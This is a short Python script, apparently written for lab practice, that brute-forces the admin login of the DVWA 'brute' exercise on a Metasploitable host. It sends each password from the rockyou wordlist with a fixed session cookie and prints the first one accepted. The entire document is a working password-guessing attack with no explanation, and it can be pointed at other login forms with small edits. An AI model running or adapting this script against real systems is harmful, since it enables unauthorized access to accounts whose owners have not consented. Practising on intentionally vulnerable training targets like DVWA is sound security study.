import requests

cookies = {
    'PHPSESSID': '3984c0ae867f0ce34b264d412463298e',
    'security': 'low'
}

with open('/usr/share/wordlists/rockyou.txt', 'r', errors='replace') as f:
    for password in f.readlines():
        url = 'http://metasploitable.xcc.tw/dvwa/vulnerabilities/brute/?username=admin&password={}&Login=Login#'.format(password.replace('\n', ''))
        if 'Username and/or password incorrect.' not in requests.get(url, cookies=cookies).text:
            print(password)
            break